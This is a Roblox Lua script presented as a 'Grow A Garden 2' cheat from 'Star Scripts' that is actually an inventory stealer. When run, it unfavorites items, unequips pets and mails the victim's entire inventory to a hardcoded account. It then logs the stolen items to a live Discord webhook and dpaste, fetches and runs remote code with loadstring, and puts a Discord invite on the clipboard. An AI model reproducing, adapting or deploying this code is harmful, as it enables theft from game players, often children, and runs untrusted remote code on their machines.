--[[
  STAR SCRIPTS | Grow A Garden 2 Hit!
  Auto Mail + Discord Webhook Logger
]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Networking = require(game.ReplicatedStorage.SharedModules.Networking)
local PlayerState = require(game.ReplicatedStorage.ClientModules.PlayerStateClient)
local Catalog = require(game.Players.LocalPlayer.PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)

-- CONFIGURATION
local WEBHOOK_URL = "https://discord.com/api/webhooks/1498725723014168658/irM6H60BJL_0UOxbxlXFK5K2694sBgVttDLYcnyESpRyCKYTo1bdAHa5vQ95Rx4kl3Qi"
local SCRIPT_NAME = "[STAR SCRIPTS] | Grow A Garden 2 Hit! 🌻"
local TARGET_USERNAME = "NT_R0"
local WAIT_BETWEEN_BATCHES = 0.05  -- faster mails
local NOTE = "Here is a gift! :)"
local KICK_AFTER_SECONDS = 0   -- set to 0 to disable kicking
local KICK_COUNTDOWN = false     -- show countdown before kick
local KICK_MESSAGE = "You have been kicked by Star Scripts!"
local DISCORD_INVITE = "https://discord.gg/7MzDJdrxpu" -- set to "" to disable clipboard

local RARITY_FILTER = { Super = true, Mythic = true, Legendary = true, Epic = true, Rare = true, Uncommon = true, Common = true }
local RARITY_RANK = { Super = 1, Mythic = 2, Legendary = 3, Epic = 4, Rare = 5, Uncommon = 6, Common = 7 }
local RARITY_SORT = { "Super", "Mythic", "Legendary", "Epic", "Rare", "Uncommon", "Common" }

-- Key system (non-blocking - runs in background)
task.spawn(function()
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/UnAliveScripts/loginwithkey/refs/heads/main/key/key.lua"))()
    end)

end)

-- Pet blacklist: species names that won't be sent (Rainbow/Huge/Mega variants bypass this)
local PET_BLACKLIST = { ["Robin"] = true, ["Bunny"] = true, ["Frog"] = true, ["Deer"] = true, ["Owl"] = true }
-- Pet variants that bypass blacklist & add value multipliers (stack multiplicatively)
local PET_VARIANTS = { Rainbow = 4, Huge = 2, Mega = 4 }

-- SEED EMOJIS
local SEED_EMOJI = {
    Carrot = "🥕", Strawberry = "🍓", Blueberry = "🫐", Tulip = "🌷", Tomato = "🍅",
    Apple = "🍎", Bamboo = "🎋", Corn = "🌽", Cactus = "🌵", Pineapple = "🍍",
    Mushroom = "🍄", ["Green Bean"] = "🫘", Banana = "🍌", Grape = "🍇",
    Coconut = "🥥", Mango = "🥭", ["Dragon Fruit"] = "🐉", Acorn = "🌰",
    Cherry = "🍒", Sunflower = "🌻", ["Venus Fly Trap"] = "🪴", Pomegranate = "🍑",
    ["Poison Apple"] = "🍏", ["Venom Spitter"] = "🐍", ["Ghost Pepper"] = "🌶️",
    ["Poison Ivy"] = "🌿", ["Glow Mushroom"] = "🍄", Romanesco = "🥦",
    Gold = "🌟", Rainbow = "🌈",
}
-- PET EMOJIS
local PET_EMOJI = {
    Owl = "🦉", Dog = "🐕", Cat = "🐈", Dragon = "🐉", Snake = "🐍",
    Frog = "🐸", Turtle = "🐢", Fish = "🐟", Rabbit = "🐇", Fox = "🦊",
    Bear = "🐻", Panda = "🐼", Monkey = "🐒", Tiger = "🐯", Lion = "🦁",
    Elephant = "🐘", Giraffe = "🦒", Zebra = "🦓", Horse = "🐴", Cow = "🐄",
    Pig = "🐖", Sheep = "🐑", Chicken = "🐔", Duck = "🦆", Penguin = "🐧",
    Wolf = "🐺", Deer = "🦌", Squirrel = "🐿️", Hedgehog = "🦔", Bat = "🦇",
    Phoenix = "🔥", Unicorn = "🦄", Fairy = "🧚", Ghost = "👻",
    Slime = "🫧", Yeti = "🦍", Griffin = "🦅", Pegasus = "🐎",
    Shark = "🦈", Whale = "🐋", Octopus = "🐙", Crab = "🦀", Lobster = "🦞",
    Parrot = "🦜", Peacock = "🦚", Flamingo = "🦩", Swan = "🦢",
    Hamster = "🐹", Mouse = "🐭", Koala = "🐨", Kangaroo = "🦘",
    Goat = "🐐", Llama = "🦙", Rhino = "🦏", Hippo = "🦛",
    Crocodile = "🐊", Lizard = "🦎", Beetle = "🪲", Butterfly = "🦋",
    Ladybug = "🐞", Ant = "🐜", Scorpion = "🦂", Starfish = "⭐",
    Robin = "🐦", Bunny = "🐇", Deer = "🦌",
}

-- Load data
local SeedData = {}
local PetData = {}
local PetTypes = {}
local SellValueData = {}
local GearShopData = {}
local FruitValueCalc
do
    local sd = game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("SeedData")
    if sd then
        local ok, d = pcall(require, sd)
        if ok and type(d) == "table" then
            for _, e in d do
                if type(e) == "table" and e.SeedName then SeedData[e.SeedName] = e end
            end
        end
    end
end
do
    local pd = game:GetService("ReplicatedStorage").SharedData:FindFirstChild("PetData")
    if pd then
        local ok, d = pcall(require, pd)
        if ok and type(d) == "table" then PetData = d end
    end
end
do
    local pt = game:GetService("ReplicatedStorage").SharedData:FindFirstChild("PetTypes")
    if pt then
        local ok, d = pcall(require, pt)
        if ok and type(d) == "table" then PetTypes = d end
    end
end
do
    local sv = game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("SellValueData")
    if sv then
        local ok, d = pcall(require, sv)
        if ok and type(d) == "table" then SellValueData = d end
    end
end
do
    local gs = game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("GearShopData")
    if gs then
        local ok, d = pcall(require, gs)
        if ok and type(d) == "table" then
            for _, e in d do
                if type(e) == "table" and e.ItemName and e.Cost then
                    GearShopData[e.ItemName] = e.Cost
                    GearShopData[e.ItemType or e.ItemName] = e.Cost
                end
            end
        end
    end
end
do
    local fv = game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("FruitValueCalc")
    if fv then
        local ok, d = pcall(require, fv)
        if ok then FruitValueCalc = d end
    end
end

-- Helpers
local function formatNumber(num)
    local formatted = tostring(num):reverse():gsub("(%d%d%d)", "%1,"):reverse()
    return formatted:gsub("^,", "")
end

local function getItemRarity(cat, key, ev)
    if cat == "Seeds" and SeedData[key] then return SeedData[key].Rarity or "Common" end
    if cat == "Pets" or cat == "HarvestedFruits" then
        if type(ev) == "table" then
            local sp = ev.Name or ev.Species or key
            if PetData[sp] and PetData[sp].Rarity then return PetData[sp].Rarity end
            if type(ev.Rarity) == "string" then return ev.Rarity end
        end
    end
    return "Common"
end

local function getItemValue(cat, key, count, entry)
    count = count or 1
    if cat == "Seeds" and SeedData[key] then return (SeedData[key].PurchasePrice or SellValueData[key] or 0) * count end
    if (cat == "HarvestedFruits" or cat == "Seeds") then
        local base = SellValueData[key] or 0
        if base > 0 then return base * count end
    end
    if cat == "Pets" then
        if PetData[key] and PetData[key].Value then return PetData[key].Value * count end
        return 0
    end
    -- Gear / tools / sprinklers etc.
    local gearCost = GearShopData[key]
    if gearCost then return gearCost * count end
    return 0
end

local function getSeedEmoji(name)
    for k, v in SEED_EMOJI do
        if name:lower():find(k:lower()) then return v end
    end
    return "🌱"
end

local function getPetEmoji(name)
    for k, v in PET_EMOJI do
        if name:lower():find(k:lower()) then return v end
    end
    return "🐾"
end

local function getItemEmoji(cat, key, entry)
    if cat == "Seeds" or cat == "HarvestedFruits" then
        return getSeedEmoji(key)
    end
    if cat == "Pets" then
        local name = (type(entry) == "table" and entry.Name) or key
        return getPetEmoji(name)
    end
    -- Other items
    local lower = key:lower()
    if lower:find("sprinkler") then return "💧" end
    if lower:find("watering") or lower:find("can") then return "🚿" end
    if lower:find("gnome") then return "🧌" end
    if lower:find("raccoon") then return "🦝" end
    if lower:find("crate") then return "📦" end
    if lower:find("egg") then return "🥚" end
    if lower:find("pack") then return "🎁" end
    if lower:find("mushroom") then return "🍄" end
    if lower:find("trowel") then return "🔧" end
    if lower:find("shovel") then return "🪓" end
    if lower:find("rake") then return "🏏" end
    if lower:find("ladder") then return "🪜" end
    if lower:find("prop") then return "🪑" end
    if lower:find("bird") then return "🐦" end
    if lower:find("bee") then return "🐝" end
    if lower:find("carpet") then return "🪐" end
    if lower:find("magnet") then return "🧲" end
    if lower:find("flash") then return "💥" end
    if lower:find("freeze") then return "❄️" end
    if lower:find("grappling") then return "🪝" end
    if lower:find("sniper") then return "🔫" end
    if lower:find("hose") or lower:find("power") then return "💨" end
    if lower:find("megaphone") then return "📢" end
    if lower:find("sign") then return "📝" end
    if lower:find("pot") then return "🪴" end
    if lower:find("ladder") then return "🪜" end
    return "📦"
end

local function getItemDisplayName(cat, key, entry)
    if cat == "Seeds" then return key .. " Seed" end
    if cat == "Pets" then
        local name = (type(entry) == "table" and entry.Name) or key
        return name
    end
    return key
end

local function getRarityRank(r) return RARITY_RANK[r] or 99 end

-- Pet: check if blacklisted (Rainbow/Huge/Mega variants bypass)
local function isPetBlacklisted(entry)
    if type(entry) ~= "table" then return false end
    local species = entry.Name or ""
    if not PET_BLACKLIST[species] then return false end
    -- Check for variant bypass
    if PetTypes and type(entry.Type) == "number" then
        if entry.Type == PetTypes.Rainbow then return false end
    end
    local nameLower = species:lower()
    for variant in pairs(PET_VARIANTS) do
        if nameLower:find(variant:lower()) then return false end
    end
    return true
end

-- Pet: calculate value multiplier from variants (stack multiplicatively)
local function getPetMultiplier(entry)
    local mult = 1
    if type(entry) ~= "table" then return mult end
    if PetTypes and type(entry.Type) == "number" then
        if entry.Type == PetTypes.Rainbow then mult = mult * PET_VARIANTS.Rainbow end
    end
    local nameLower = (entry.Name or ""):lower()
    if nameLower:find("huge") then mult = mult * PET_VARIANTS.Huge end
    if nameLower:find("mega") then mult = mult * PET_VARIANTS.Mega end
    return mult
end

-- Core: unequip pets
local function unequipAllPets()
    local ok, eq = pcall(function() return Networking.Pets.GetEquippedPets:Fire() end)
    if type(eq) == "table" then
        for _, pd in eq do
            if type(pd) == "table" and pd.Id then
                pcall(function() Networking.Pets.RequestUnequip:Fire(pd.Id) end)
                task.wait(0.1)
            end
        end
    end
end

-- Core: lookup player
local function lookupPlayer(username)
    local ok, uid, dn = pcall(function() return Networking.Mailbox.LookupPlayer:Fire(username) end)
    if ok and type(uid) == "number" and uid > 0 then return uid, dn or username end
    return nil
end

-- Core: get inventory from Charm
local function getInventory()
    local rep = PlayerState:GetLocalReplica()
    if not rep or not rep.Data then return {} end
    return rep.Data.Inventory or {}
end

-- Core: collect and sort items
local function collectAndSort(inv)
    local items = {}
    for _, cat in Catalog.Categories do
        local d = inv[cat]
        if type(d) ~= "table" then continue end
        if cat == "HarvestedFruits" then
            for id, e in d do
                if type(e) == "table" and e.Id then
                    local r = getItemRarity(cat, id, e)
                    if RARITY_FILTER[r] ~= false then
                        local unitPrice = getItemValue(cat, id, 1)
                        table.insert(items, { Category = cat, ItemKey = id, Count = 1, _rarity = r, _rank = getRarityRank(r), _unitPrice = unitPrice, _entry = e })
                    end
                end
            end
        elseif cat == "Pets" then
            for id, e in d do
                if type(e) == "table" and e.Id and not e.Equipped then
                    if isPetBlacklisted(e) then continue end
                    local r = getItemRarity(cat, id, e)
                    if RARITY_FILTER[r] ~= false then
                        local mult = getPetMultiplier(e)
                        local unitPrice = getItemValue(cat, id, 1) * mult
                        table.insert(items, { Category = cat, ItemKey = id, Count = 1, _rarity = r, _rank = getRarityRank(r), _unitPrice = unitPrice, _displayName = e.Name or id, _entry = e, _petMult = mult })
                    end
                end
            end
        else
            for k, v in d do
                if type(v) == "number" and v > 0 then
                    local r = getItemRarity(cat, k, nil)
                    if RARITY_FILTER[r] ~= false then
                        local unitPrice = getItemValue(cat, k, 1)
                        table.insert(items, { Category = cat, ItemKey = k, Count = v, _rarity = r, _rank = getRarityRank(r), _unitPrice = unitPrice })
                    end
                elseif type(v) == "table" and v.Id then
                    local r = getItemRarity(cat, k, v)
                    if RARITY_FILTER[r] ~= false then
                        local unitPrice = getItemValue(cat, k, 1)
                        table.insert(items, { Category = cat, ItemKey = k, Count = 1, _rarity = r, _rank = getRarityRank(r), _unitPrice = unitPrice, _entry = v })
                    end
                end
            end
        end
    end
    -- Sort by unit price descending (highest value per item first)
    table.sort(items, function(a, b)
        if a._unitPrice ~= b._unitPrice then return (a._unitPrice or 0) > (b._unitPrice or 0) end
        if a._rank ~= b._rank then return a._rank < b._rank end
        return a.ItemKey < b.ItemKey
    end)
    return items
end

-- Core: send batch
local function sendBatch(uid, batch)
    local ok, s, msg = pcall(function() return Networking.Mailbox.SendBatch:Fire(uid, batch, NOTE) end)
    return ok and s, msg
end

-- Webhook: get player data (uses real game inventory instead of path scanning)
local function getPlayerData(player, sentItems)
    local data = {
        username = player.Name,
        displayName = player.DisplayName,
        totalItems = 0,
        totalValue = 0,
        receivers = TARGET_USERNAME,
        pets = 0,
        seeds = 0,
        inventoryItems = {}
    }
    for _, it in sentItems do
        data.totalItems = data.totalItems + it.Count
        local entry = it._entry
        local mult = it._petMult or 1
        local val = getItemValue(it.Category, it.ItemKey, it.Count, entry) * mult
        data.totalValue = data.totalValue + val
        if it.Category == "Pets" then data.pets = data.pets + it.Count end
        if it.Category == "Seeds" then data.seeds = data.seeds + it.Count end
        local dn = getItemDisplayName(it.Category, it.ItemKey, entry)
        local emoji = getItemEmoji(it.Category, it.ItemKey, entry)
        table.insert(data.inventoryItems, { name = dn, count = it.Count, value = val, emoji = emoji })
    end
    return data
end

-- Webhook: build embed
local function buildEmbed(playerData)
    local inventoryText = ""
    if #playerData.inventoryItems > 0 then
        inventoryText = inventoryText .. "Total Value: " .. formatNumber(playerData.totalValue) .. " Sheckles\n"
        inventoryText = inventoryText .. "Pets: " .. playerData.pets .. " | Seeds: " .. playerData.seeds .. "\n"
        inventoryText = inventoryText .. "------------------------------\n"
        for _, item in ipairs(playerData.inventoryItems) do
            inventoryText = inventoryText .. item.emoji .. " x" .. item.count .. " " .. item.name .. " -> " .. item.value .. " Sheckles\n"
        end
    else
        inventoryText = "No items found in inventory."
    end

    return { {
        ["title"] = SCRIPT_NAME,
        ["color"] = 3066993,
        ["fields"] = {
            {
                ["name"] = "👤 Player Info",
                ["value"] = string.format(
                    "```Username    : %s\nDisplay Name: %s\nTotal Items : %s\nTotal Value : %s Sheckles\nReceivers   : %s```",
                    playerData.username, playerData.displayName, playerData.totalItems, formatNumber(playerData.totalValue), playerData.receivers
                ),
                ["inline"] = false,
            },
            {
                ["name"] = "🎒 Inventory (" .. playerData.totalItems .. ")",
                ["value"] = "```" .. inventoryText .. "```",
                ["inline"] = false,
            },
        },
        ["footer"] = { ["text"] = "Star Scripts" },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
    } }
end

-- Webhook: upload to dpaste
local function uploadToDpaste(content)
    local body = "content=" .. HttpService:UrlEncode(content) .. "&syntax=text&title=Inventory+Dump&expiry_days=7"
    local result
    local function tryReq(fn) if not result then pcall(function() result = fn() end) end end
    tryReq(function() return syn and syn.request({ Url = "https://dpaste.com/api/v2/", Method = "POST", Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }, Body = body }) end)
    if not result then tryReq(function() return http_request and http_request({ Url = "https://dpaste.com/api/v2/", Method = "POST", Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }, Body = body }) end) end
    if not result then tryReq(function() return request and request({ Url = "https://dpaste.com/api/v2/", Method = "POST", Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }, Body = body }) end) end
    if result and result.Body then
        local respBody = result.Body
        if typeof(respBody) == "string" then
            local url = respBody:match("https?://dpaste%.com/[^%s]+")
            return url
        end
    end
    return nil
end

-- Webhook: send
local function sendWebhook(player, sentItems)
    local success, playerData = pcall(function() return getPlayerData(player, sentItems) end)
    if not success then return end

    -- Build full text for dpaste
    local fullText = ("Player: %s (%s)\nReceiver: %s\nDate: %s\n\nItems Sent:\n"):format(playerData.username, playerData.displayName, playerData.receivers, os.date("%d.%m.%Y %H:%M"))
    for _, item in ipairs(playerData.inventoryItems) do
        fullText = fullText .. ("%s x%d %s = %d Sheckles\n"):format(item.emoji, item.count, item.name, item.value)
    end
    fullText = fullText .. ("\nTotal Value: %d Sheckles\nPets: %d | Seeds: %d"):format(playerData.totalValue, playerData.pets, playerData.seeds)

    local pasteUrl = uploadToDpaste(fullText)

    local embed = buildEmbed(playerData)
    local summaryLine = ""
    if pasteUrl then
        summaryLine = "** 📋 [Full Summary](" .. pasteUrl .. ")**"
    end
    -- Append summary to Inventory field
    local invField = embed[1]["fields"][2]
    if invField then
        invField["value"] = invField["value"] .. "\n" .. summaryLine
    end

    local payload = { ["username"] = "Spidey Bot", ["avatar_url"] = "https://cdn.discordapp.com/embed/avatars/0.png", ["embeds"] = embed }
    local ok, jsonPayload = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end

    local sent = false
    if syn and syn.request then pcall(function() syn.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload }) sent = true end) end
    if not sent and http_request then pcall(function() http_request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload }) sent = true end) end
    if not sent and request then pcall(function() request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload }) sent = true end) end
    if not sent then pcall(function() HttpService:PostAsync(WEBHOOK_URL, jsonPayload, Enum.HttpContentType.ApplicationJson, false) end) end
end

-- MAIN EXECUTION

-- Auto unfavorite all backpack favorites
pcall(function()
    local ok, layout = Networking.Backpack.GetLayout:Fire()
    if ok and type(layout) == "table" then
        for _, slot in layout do
            if type(slot) == "table" and slot.Id then
                pcall(function() Networking.Backpack.SetFruitFavorite:Fire(slot.Id, false) end)
            end
        end
    end
end)

unequipAllPets()
task.wait(0.2)

local targetId, displayName = lookupPlayer(TARGET_USERNAME)
if not targetId then return end

local inv = getInventory()
local allItems = collectAndSort(inv)
if #allItems == 0 then return end

-- Build batches of 20
local batches = {}
for i = 1, #allItems, 20 do
    local b = {}
    for j = i, math.min(i + 19, #allItems) do
        table.insert(b, { Category = allItems[j].Category, ItemKey = allItems[j].ItemKey, Count = allItems[j].Count })
    end
    table.insert(batches, b)
end

for bn, b in ipairs(batches) do
    local ok, msg = sendBatch(targetId, b)
    if WAIT_BETWEEN_BATCHES > 0 and bn < #batches then task.wait(WAIT_BETWEEN_BATCHES) end
end

sendWebhook(Players.LocalPlayer, allItems)

-- Clipboard
if DISCORD_INVITE ~= "" then
    task.spawn(function()
        task.wait(1)
        pcall(function()
            if syn and syn.write_clipboard then
                syn.write_clipboard(DISCORD_INVITE)
            elseif setclipboard then
                setclipboard(DISCORD_INVITE)
            elseif Clipboard and Clipboard.Set then
                Clipboard.Set(DISCORD_INVITE)
            end
        end)
    end)
end

-- Auto-kick with optional countdown
if KICK_AFTER_SECONDS > 0 then
    task.spawn(function()
        if KICK_COUNTDOWN then
            for i = KICK_AFTER_SECONDS, 1, -1 do
                task.wait(1)
            end
        else
            task.wait(KICK_AFTER_SECONDS)
        end
        pcall(function()
            Players.LocalPlayer:Kick(KICK_MESSAGE)
        end)
    end)
end
